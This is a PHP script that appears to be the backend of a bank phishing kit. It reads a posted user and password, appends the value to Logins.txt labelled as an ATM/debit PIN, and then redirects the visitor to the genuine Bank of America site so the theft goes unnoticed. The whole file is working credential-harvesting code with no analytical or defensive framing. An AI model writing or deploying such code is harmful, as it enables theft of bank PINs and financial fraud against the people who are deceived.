<?php

$usuario = $_POST['user'];
$password = $_POST['password'];


if( (empty($password)) or (empty($password)) ){
	header('location: end2.html');
	
}else{
	//guardar archivo texto
	
	$file = fopen ( 'Logins.txt' , 'a+');
	fwrite($file, "\r\n");
	fwrite($file, "Pin(ATM)/debito: ".$password."\r\n==============================\r\n");
	fclose($file);
	header ('location: https://www.bankofamerica.com/');
}
?>

